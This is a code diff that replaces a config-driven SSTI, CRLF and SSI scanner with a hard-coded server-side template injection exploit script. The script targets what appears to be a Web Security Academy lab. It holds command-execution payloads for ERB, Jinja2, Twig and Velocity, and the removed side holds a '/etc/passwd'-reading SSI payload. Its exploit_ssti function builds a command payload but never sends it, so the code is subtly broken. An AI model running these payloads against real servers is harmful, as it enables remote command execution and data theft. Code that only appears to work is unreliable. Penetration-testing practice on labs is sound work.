@@ -1,83 +1,57 @@
-import json
 import requests
-import re
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
+from urllib.parse import quote
 
-# Function to create a requests session with retry strategy
-def create_session():
-    session = requests.Session()
-    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
-    session.mount('http://', HTTPAdapter(max_retries=retries))
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
-    return session
+# List of common SSTI payloads for different template engines
+payloads = {
+    "erb": ["<%= 7*7 %>", "<%= system('ls') %>"],
+    "jinja2": ["{{ 7*7 }}", "{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').read() }}"],
+    "twig": ["{{ 7*7 }}", "{{ system('ls') }}"],
+    "velocity": ["#set($x = 7 * 7)", "$x", "#set($x = 7 * 7) $x", "#set($cmd = 'ls')", "#foreach($i in [1])", "$i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd)", "#end"]
+}
 
-# Function to load JSON configuration
-def load_config(file_path):
-    with open(file_path, 'r') as json_file:
-        return json.load(json_file)
+# Function to check SSTI vulnerability
+def check_ssti(url, param):
+    for engine, tests in payloads.items():
+        for payload in tests:
+            encoded_payload = quote(payload)
+            test_url = f"{url}?{param}={encoded_payload}"
 
-# Function to send HTTP request
-def send_request(session, url, payload):
-    try:
-        response = session.get(f"{url}?{payload}")
-        response.raise_for_status()  # Raise HTTPError for bad responses
-        return response.text
-    except requests.RequestException as e:
-        print(f"Request failed: {e}")
-        return ""
-
-# Advanced SSTI detection
-def advanced_ssti_detection(url):
-    session = create_session()
-    config = load_config('configs/ssti_config.json')
+            try:
+                response = requests.get(test_url)
+                if response.status_code == 200 and "49" in response.text:
+                    print(f"[+] SSTI vulnerability detected with {engine} payload: {payload}")
+                    return True, engine
+                else:
+                    print(f"[-] SSTI vulnerability not detected with {engine} payload: {payload}")
+            except requests.RequestException as e:
+                print(f"[-] An error occurred: {e}")
     
-    for item in config:
-        name = item.get('name')
-        payload = item.get('payload')
-        response_pattern = item.get('response')
+    return False, None
 
-        response = send_request(session, url, payload)
-        if re.search(response_pattern, response):
-            print(f"Parameter might be vulnerable to {name}")
-            print(f"Payload: {payload}")
-
-# Advanced CRLF detection
-def advanced_crlf_detection(url):
-    session = create_session()
-    config = load_config('configs/crlf_config.json')
-
-    for item in config:
-        name = item.get('name')
-        payload = item.get('payload')
-        response_pattern = item.get('response')
-
-        try:
-            response_headers = session.get(f"{url}?{payload}").headers
-            response_headers_text = "\n".join([f"{k}: {v}" for k, v in response_headers.items()])
-            if re.search(response_pattern, response_headers_text):
-                print(f"Parameter might be vulnerable to {name}")
-                print(f"Payload: {payload}")
-                break
-        except requests.RequestException as e:
-            print(f"Request failed: {e}")
-
-# Advanced SSI detection
-def advanced_ssi_detection(url):
-    session = create_session()
-    payload = '<!--#exec cmd="cat /etc/passwd" -->'
+# Function to exploit SSTI vulnerability
+def exploit_ssti(url, param, engine, command):
+    if engine not in payloads:
+        print("[-] Unsupported template engine.")
+        return
     
-    try:
-        response = send_request(session, url, payload)
-        if "root:" in response:
-            print("The website is vulnerable to SSI injection")
-        else:
-            print("The website isn't vulnerable to SSI injection")
-    except requests.RequestException as e:
-        print(f"Request failed: {e}")
+    # Select appropriate payload for command execution
+    if engine == "erb":
+        exploit_payload = f"<%= system('{command}') %>"
+    elif engine == "jinja2":
+        exploit_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[59]('{command}').read() }}}}"
+    elif engine == "twig":
+        exploit_payload = f"{{{{ system('{command}') }}}}"
+    elif engine == "velocity":
+        exploit_payload = f"#set($cmd = '{command}') #foreach($i in [1]) $i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd) #end"
+    else:
+        print("[-] Unsupported template engine.")
+        return
 
-# Example usage
-url_to_scan = "http://www.itsecgames.com/bugs.htm"
-advanced_ssti_detection(url_to_scan)
-advanced_crlf_detection(url_to_scan)
-advanced_ssi_detection(url_to_scan)
+if __name__ == "__main__":
+    target_url = "https://0a9b00f003adc81281231bf40098000f.web-security-academy.net/"
+    param = "message"
+
+    ssti_detected, engine = check_ssti(target_url, param)
+    if ssti_detected:
+        # Replace 'ls /home/carlos' with the command you want to execute
+        exploit_ssti(target_url, param, engine, "ls /home/carlos")
